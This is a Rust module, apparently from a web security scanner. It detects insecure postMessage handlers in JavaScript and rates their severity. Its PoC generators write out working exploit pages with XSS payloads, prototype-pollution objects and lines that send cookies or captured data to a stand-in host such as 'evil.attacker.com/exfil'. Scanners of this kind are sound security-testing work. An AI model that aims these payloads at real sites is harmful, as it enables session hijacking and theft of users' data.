use std::fmt;

use regex::Regex;
use serde::{Deserialize, Serialize};

/// Severity rating for a postMessage vulnerability finding.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize, PartialOrd, Ord)]
pub enum PostMessageSeverity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

impl fmt::Display for PostMessageSeverity {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::Info => "info",
            Self::Low => "low",
            Self::Medium => "medium",
            Self::High => "high",
            Self::Critical => "critical",
        };
        write!(f, "{label}")
    }
}

/// Category of postMessage vulnerability discovered.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum PostMessageVulnType {
    /// Handler accepts messages without checking event.origin.
    MissingOriginCheck,
    /// Handler passes event.data to a dangerous DOM sink.
    DangerousSink,
    /// Handler responds with sensitive data to any origin.
    CrossOriginDataLeak,
    /// Uses window.opener or window.parent messaging without origin validation.
    WindowReferenceAttack,
    /// Handler merges event.data into an object, enabling prototype pollution.
    PrototypePollution,
}

impl fmt::Display for PostMessageVulnType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::MissingOriginCheck => "missing-origin-check",
            Self::DangerousSink => "dangerous-sink",
            Self::CrossOriginDataLeak => "cross-origin-data-leak",
            Self::WindowReferenceAttack => "window-reference-attack",
            Self::PrototypePollution => "prototype-pollution",
        };
        write!(f, "{label}")
    }
}

/// The specific DOM sink that event.data flows into.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum DomSink {
    InnerHtml,
    OuterHtml,
    Eval,
    SetTimeout,
    SetInterval,
    Function,
    LocationHref,
    LocationAssign,
    LocationReplace,
    DocumentWrite,
    ScriptSrc,
    ScriptTextContent,
    InsertAdjacentHtml,
}

impl fmt::Display for DomSink {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::InnerHtml => "innerHTML",
            Self::OuterHtml => "outerHTML",
            Self::Eval => "eval()",
            Self::SetTimeout => "setTimeout()",
            Self::SetInterval => "setInterval()",
            Self::Function => "Function()",
            Self::LocationHref => "location.href",
            Self::LocationAssign => "location.assign()",
            Self::LocationReplace => "location.replace()",
            Self::DocumentWrite => "document.write()",
            Self::ScriptSrc => "script.src",
            Self::ScriptTextContent => "script.textContent",
            Self::InsertAdjacentHtml => "insertAdjacentHTML()",
        };
        write!(f, "{label}")
    }
}

/// A discovered message event listener in JavaScript source code.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MessageListener {
    pub handler_body: String,
    pub line_hint: usize,
    pub has_origin_check: bool,
    pub sinks: Vec<DomSink>,
    pub responds_with_data: bool,
    pub uses_window_reference: bool,
    pub has_prototype_merge: bool,
}

/// A single postMessage vulnerability finding.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PostMessageFinding {
    pub vuln_type: PostMessageVulnType,
    pub severity: PostMessageSeverity,
    pub description: String,
    pub sink: Option<DomSink>,
    pub handler_snippet: String,
    pub poc_html: Option<String>,
}

/// Full result of postMessage vulnerability analysis on a page.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PostMessageAnalysis {
    pub target_url: String,
    pub listeners_found: Vec<MessageListener>,
    pub findings: Vec<PostMessageFinding>,
    pub summary: PostMessageSummary,
}

/// Summary statistics for a postMessage analysis run.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PostMessageSummary {
    pub total_listeners: usize,
    pub total_findings: usize,
    pub critical_count: usize,
    pub high_count: usize,
    pub exploitable_count: usize,
}

/// Configuration for the postMessage scanner.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PostMessageConfig {
    pub target_url: String,
    pub attacker_origin: String,
    pub generate_poc: bool,
}

impl Default for PostMessageConfig {
    fn default() -> Self {
        Self {
            target_url: String::new(),
            attacker_origin: "https://evil.attacker.com".to_string(),
            generate_poc: true,
        }
    }
}

impl PostMessageConfig {
    pub fn with_target(mut self, url: &str) -> Self {
        self.target_url = url.to_string();
        self
    }

    pub fn with_attacker_origin(mut self, origin: &str) -> Self {
        self.attacker_origin = origin.to_string();
        self
    }

    pub fn with_poc_generation(mut self, enabled: bool) -> Self {
        self.generate_poc = enabled;
        self
    }
}

/// Extracts all message event listener handler bodies from JavaScript source.
/// Returns a vec of (handler_body, approximate_line_number) tuples.
pub fn extract_message_listeners(js_source: &str) -> Vec<(String, usize)> {
    let mut results = Vec::new();

    let listener_re = Regex::new(
        r#"(?s)(?:addEventListener|on)\s*\(\s*['"`]message['"`]\s*,\s*(?:function\s*\([^)]*\)|(\([^)]*\)|\w+)\s*=>)"#,
    )
    .expect("valid regex");

    for mat in listener_re.find_iter(js_source) {
        let start = mat.start();
        let line_number = js_source[..start].matches('\n').count() + 1;

        if let Some(body) = extract_brace_block(js_source, mat.end()) {
            results.push((body, line_number));
        }
    }

    let onmessage_re = Regex::new(
        r#"(?s)(?:window\.)?onmessage\s*=\s*(?:function\s*\([^)]*\)|(\([^)]*\)|\w+)\s*=>)"#,
    )
    .expect("valid regex");

    for mat in onmessage_re.find_iter(js_source) {
        let start = mat.start();
        let line_number = js_source[..start].matches('\n').count() + 1;

        if let Some(body) = extract_brace_block(js_source, mat.end()) {
            results.push((body, line_number));
        }
    }

    results
}

/// Extracts the content between the next `{` and its matching `}` after `offset`.
fn extract_brace_block(source: &str, offset: usize) -> Option<String> {
    let remaining = source.get(offset..)?;
    let brace_start = remaining.find('{')?;
    let after_brace = offset + brace_start + 1;

    let mut depth = 1u32;
    for (i, ch) in source[after_brace..].char_indices() {
        match ch {
            '{' => depth += 1,
            '}' => {
                depth -= 1;
                if depth == 0 {
                    return Some(source[after_brace..after_brace + i].to_string());
                }
            }
            _ => {}
        }
    }
    None
}

/// Checks whether a handler body contains origin validation.
pub fn has_origin_validation(handler_body: &str) -> bool {
    let patterns = [
        r"event\.origin\s*===",
        r"event\.origin\s*!==",
        r"event\.origin\s*==\s",
        r"event\.origin\s*!=\s",
        r"e\.origin\s*===",
        r"e\.origin\s*!==",
        r"e\.origin\s*==\s",
        r"e\.origin\s*!=\s",
        r"msg\.origin\s*===",
        r"msg\.origin\s*!==",
        r"\.origin\.includes\(",
        r"\.origin\.startsWith\(",
        r"\.origin\.endsWith\(",
        r"\.origin\.indexOf\(",
        r"\.origin\.match\(",
        r"allowedOrigins\.includes\(",
        r"allowedOrigins\.has\(",
        r"trustedOrigins",
        r"ALLOWED_ORIGINS",
        r"whitelistedOrigins",
    ];

    for pat in &patterns {
        if let Ok(re) = Regex::new(pat)
            && re.is_match(handler_body)
        {
            return true;
        }
    }

    false
}

/// Identifies dangerous DOM sinks that event.data flows into within a handler.
pub fn detect_sinks(handler_body: &str) -> Vec<DomSink> {
    let mut sinks = Vec::new();

    let sink_patterns: &[(&str, DomSink)] = &[
        (r"\.innerHTML\s*=", DomSink::InnerHtml),
        (r"\.outerHTML\s*=", DomSink::OuterHtml),
        (r"\beval\s*\(", DomSink::Eval),
        (
            r"\bsetTimeout\s*\(\s*(?:event|e|msg)\.",
            DomSink::SetTimeout,
        ),
        (
            r"\bsetInterval\s*\(\s*(?:event|e|msg)\.",
            DomSink::SetInterval,
        ),
        (r"\bnew\s+Function\s*\(", DomSink::Function),
        (r"(?:window\.)?location\.href\s*=", DomSink::LocationHref),
        (
            r"(?:window\.)?location\.assign\s*\(",
            DomSink::LocationAssign,
        ),
        (
            r"(?:window\.)?location\.replace\s*\(",
            DomSink::LocationReplace,
        ),
        (r"document\.write\s*\(", DomSink::DocumentWrite),
        (r"\.src\s*=\s*(?:event|e|msg)\.", DomSink::ScriptSrc),
        (
            r"\.textContent\s*=\s*(?:event|e|msg)\.",
            DomSink::ScriptTextContent,
        ),
        (r"\.insertAdjacentHTML\s*\(", DomSink::InsertAdjacentHtml),
    ];

    for (pat, sink) in sink_patterns {
        if let Ok(re) = Regex::new(pat)
            && re.is_match(handler_body)
        {
            sinks.push(*sink);
        }
    }

    sinks
}

/// Detects whether a handler sends data back via postMessage (potential data leak).
pub fn detects_data_response(handler_body: &str) -> bool {
    let response_re = Regex::new(r"(?:source|parent|opener|sender)\s*\.\s*postMessage\s*\(")
        .expect("valid regex");

    response_re.is_match(handler_body)
}

/// Detects window.opener or window.parent message passing patterns.
pub fn detects_window_reference(handler_body: &str) -> bool {
    let ref_re = Regex::new(r"(?:window\.(?:opener|parent)|parent|opener)\s*\.\s*postMessage\s*\(")
        .expect("valid regex");

    ref_re.is_match(handler_body)
}

/// Detects prototype pollution patterns — Object.assign, spread merge, or direct __proto__ access
/// on event.data flowing into an object.
pub fn detects_prototype_pollution(handler_body: &str) -> bool {
    let patterns = [
        r"Object\.assign\s*\(\s*\{",
        r"\.\.\.\s*(?:event|e|msg)\.data",
        r"__proto__",
        r"\bmerge\s*\(\s*(?:event|e|msg)\.data",
        r"\bextend\s*\(\s*(?:event|e|msg)\.data",
        r"(?:event|e|msg)\.data\[",
        r"for\s*\(\s*(?:let|var|const)\s+\w+\s+in\s+(?:event|e|msg)\.data\s*\)",
    ];

    for pat in &patterns {
        if let Ok(re) = Regex::new(pat)
            && re.is_match(handler_body)
        {
            return true;
        }
    }

    false
}

/// Analyzes a single listener and produces all applicable findings.
fn analyze_listener(
    listener: &MessageListener,
    config: &PostMessageConfig,
) -> Vec<PostMessageFinding> {
    let mut findings = Vec::new();
    let snippet = truncate_snippet(&listener.handler_body, 200);

    if !listener.has_origin_check {
        let poc = if config.generate_poc {
            Some(generate_no_origin_poc(config))
        } else {
            None
        };

        findings.push(PostMessageFinding {
            vuln_type: PostMessageVulnType::MissingOriginCheck,
            severity: PostMessageSeverity::High,
            description: format!(
                "Message handler at line ~{} accepts messages from any origin without validation",
                listener.line_hint
            ),
            sink: None,
            handler_snippet: snippet.clone(),
            poc_html: poc,
        });
    }

    for sink in &listener.sinks {
        let severity = if listener.has_origin_check {
            PostMessageSeverity::Medium
        } else {
            match sink {
                DomSink::Eval | DomSink::Function | DomSink::DocumentWrite => {
                    PostMessageSeverity::Critical
                }
                DomSink::InnerHtml
                | DomSink::OuterHtml
                | DomSink::InsertAdjacentHtml
                | DomSink::ScriptSrc
                | DomSink::ScriptTextContent => PostMessageSeverity::Critical,
                DomSink::LocationHref | DomSink::LocationAssign | DomSink::LocationReplace => {
                    PostMessageSeverity::High
                }
                DomSink::SetTimeout | DomSink::SetInterval => PostMessageSeverity::High,
            }
        };

        let poc = if config.generate_poc && !listener.has_origin_check {
            Some(generate_sink_poc(config, *sink))
        } else {
            None
        };

        findings.push(PostMessageFinding {
            vuln_type: PostMessageVulnType::DangerousSink,
            severity,
            description: format!(
                "event.data flows to {} sink at line ~{} {}",
                sink,
                listener.line_hint,
                if listener.has_origin_check {
                    "(origin check present but sink still dangerous)"
                } else {
                    "(no origin check — fully exploitable)"
                }
            ),
            sink: Some(*sink),
            handler_snippet: snippet.clone(),
            poc_html: poc,
        });
    }

    if listener.responds_with_data && !listener.has_origin_check {
        findings.push(PostMessageFinding {
            vuln_type: PostMessageVulnType::CrossOriginDataLeak,
            severity: PostMessageSeverity::High,
            description: format!(
                "Handler at line ~{} responds with data via postMessage to any requesting origin",
                listener.line_hint
            ),
            sink: None,
            handler_snippet: snippet.clone(),
            poc_html: if config.generate_poc {
                Some(generate_data_leak_poc(config))
            } else {
                None
            },
        });
    }

    if listener.uses_window_reference && !listener.has_origin_check {
        findings.push(PostMessageFinding {
            vuln_type: PostMessageVulnType::WindowReferenceAttack,
            severity: PostMessageSeverity::High,
            description: format!(
                "Handler at line ~{} uses window.opener/parent postMessage without origin check",
                listener.line_hint
            ),
            sink: None,
            handler_snippet: snippet.clone(),
            poc_html: if config.generate_poc {
                Some(generate_window_ref_poc(config))
            } else {
                None
            },
        });
    }

    if listener.has_prototype_merge && !listener.has_origin_check {
        findings.push(PostMessageFinding {
            vuln_type: PostMessageVulnType::PrototypePollution,
            severity: PostMessageSeverity::Critical,
            description: format!(
                "Handler at line ~{} merges event.data into objects without origin check — prototype pollution possible",
                listener.line_hint
            ),
            sink: None,
            handler_snippet: snippet,
            poc_html: if config.generate_poc {
                Some(generate_prototype_pollution_poc(config))
            } else {
                None
            },
        });
    }

    findings
}

/// Run the full postMessage vulnerability analysis pipeline on JavaScript source code.
pub fn analyze_postmessage(js_source: &str, config: &PostMessageConfig) -> PostMessageAnalysis {
    let raw_listeners = extract_message_listeners(js_source);

    let listeners: Vec<MessageListener> = raw_listeners
        .into_iter()
        .map(|(body, line)| {
            let origin_check = has_origin_validation(&body);
            let sinks = detect_sinks(&body);
            let responds = detects_data_response(&body);
            let window_ref = detects_window_reference(&body);
            let proto_merge = detects_prototype_pollution(&body);

            MessageListener {
                handler_body: body,
                line_hint: line,
                has_origin_check: origin_check,
                sinks,
                responds_with_data: responds,
                uses_window_reference: window_ref,
                has_prototype_merge: proto_merge,
            }
        })
        .collect();

    let mut findings: Vec<PostMessageFinding> = listeners
        .iter()
        .flat_map(|l| analyze_listener(l, config))
        .collect();

    findings.sort_by(|a, b| b.severity.cmp(&a.severity));

    let critical_count = findings
        .iter()
        .filter(|f| f.severity == PostMessageSeverity::Critical)
        .count();
    let high_count = findings
        .iter()
        .filter(|f| f.severity == PostMessageSeverity::High)
        .count();
    let exploitable_count = findings.iter().filter(|f| f.poc_html.is_some()).count();

    let summary = PostMessageSummary {
        total_listeners: listeners.len(),
        total_findings: findings.len(),
        critical_count,
        high_count,
        exploitable_count,
    };

    PostMessageAnalysis {
        target_url: config.target_url.clone(),
        listeners_found: listeners,
        findings,
        summary,
    }
}

/// Generates a PoC HTML page exploiting a missing origin check.
pub fn generate_no_origin_poc(config: &PostMessageConfig) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>postMessage Origin Bypass PoC</title></head>
<body>
<h1>postMessage — Missing Origin Check</h1>
<p>Attacker origin: {attacker}</p>
<iframe id="target" src="{target}" style="width:600px;height:400px;"></iframe>
<script>
var iframe = document.getElementById("target");
iframe.onload = function() {{
    iframe.contentWindow.postMessage("attacker_controlled_data", "*");
    iframe.contentWindow.postMessage({{"type":"xss","payload":"<img src=x onerror=alert(document.domain)>"}}, "*");
    iframe.contentWindow.postMessage({{"cmd":"redirect","url":"{attacker}/steal?cookie=" + document.cookie}}, "*");
}};
</script>
</body>
</html>"#,
        target = config.target_url,
        attacker = config.attacker_origin,
    )
}

/// Generates a PoC targeting a specific dangerous sink.
pub fn generate_sink_poc(config: &PostMessageConfig, sink: DomSink) -> String {
    let payload = match sink {
        DomSink::InnerHtml | DomSink::OuterHtml | DomSink::InsertAdjacentHtml => {
            r#""<img src=x onerror=alert(document.domain)>""#
        }
        DomSink::Eval | DomSink::Function | DomSink::SetTimeout | DomSink::SetInterval => {
            r#""alert(document.domain)""#
        }
        DomSink::LocationHref | DomSink::LocationAssign | DomSink::LocationReplace => {
            r#""javascript:alert(document.domain)""#
        }
        DomSink::DocumentWrite => r#""<script>alert(document.domain)<\/script>""#,
        DomSink::ScriptSrc => &format!(r#""{}/malicious.js""#, config.attacker_origin),
        DomSink::ScriptTextContent => r#""alert(document.domain)""#,
    };

    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>postMessage Sink Exploit — {sink}</title></head>
<body>
<h1>postMessage → {sink} Exploit</h1>
<iframe id="target" src="{target}"></iframe>
<script>
var iframe = document.getElementById("target");
iframe.onload = function() {{
    iframe.contentWindow.postMessage({payload}, "*");
}};
</script>
</body>
</html>"#,
        sink = sink,
        target = config.target_url,
        payload = payload,
    )
}

/// Generates a PoC for cross-origin data theft via postMessage response.
pub fn generate_data_leak_poc(config: &PostMessageConfig) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>postMessage Data Leak PoC</title></head>
<body>
<h1>Cross-Origin Data Theft via postMessage</h1>
<div id="stolen"></div>
<iframe id="target" src="{target}"></iframe>
<script>
window.addEventListener("message", function(e) {{
    document.getElementById("stolen").textContent = "Stolen: " + JSON.stringify(e.data);
    new Image().src = "{attacker}/exfil?data=" + encodeURIComponent(JSON.stringify(e.data));
}});
var iframe = document.getElementById("target");
iframe.onload = function() {{
    iframe.contentWindow.postMessage({{"type":"getConfig"}}, "*");
    iframe.contentWindow.postMessage({{"type":"getUserData"}}, "*");
    iframe.contentWindow.postMessage("ping", "*");
}};
</script>
</body>
</html>"#,
        target = config.target_url,
        attacker = config.attacker_origin,
    )
}

/// Generates a PoC for window.opener/parent reference attacks.
pub fn generate_window_ref_poc(config: &PostMessageConfig) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>postMessage Window Reference Attack PoC</title></head>
<body>
<h1>window.opener/parent postMessage Attack</h1>
<div id="captured"></div>
<script>
window.addEventListener("message", function(e) {{
    document.getElementById("captured").textContent = "Captured: " + JSON.stringify(e.data);
    new Image().src = "{attacker}/exfil?data=" + encodeURIComponent(JSON.stringify(e.data));
}});
var popup = window.open("{target}", "targetWindow");
</script>
</body>
</html>"#,
        target = config.target_url,
        attacker = config.attacker_origin,
    )
}

/// Generates a PoC for prototype pollution via postMessage.
pub fn generate_prototype_pollution_poc(config: &PostMessageConfig) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>postMessage Prototype Pollution PoC</title></head>
<body>
<h1>Prototype Pollution via postMessage</h1>
<iframe id="target" src="{target}"></iframe>
<script>
var iframe = document.getElementById("target");
iframe.onload = function() {{
    iframe.contentWindow.postMessage(
        JSON.parse('{{"__proto__":{{"isAdmin":true,"role":"admin"}}}}'),
        "*"
    );
    iframe.contentWindow.postMessage(
        JSON.parse('{{"constructor":{{"prototype":{{"isAdmin":true}}}}}}'),
        "*"
    );
}};
</script>
</body>
</html>"#,
        target = config.target_url,
    )
}

fn truncate_snippet(s: &str, max_len: usize) -> String {
    if s.len() <= max_len {
        s.to_string()
    } else {
        format!("{}...", &s[..max_len])
    }
}

#[cfg(test)]
#[path = "postmessage_attack_test.rs"]
mod postmessage_attack_test;
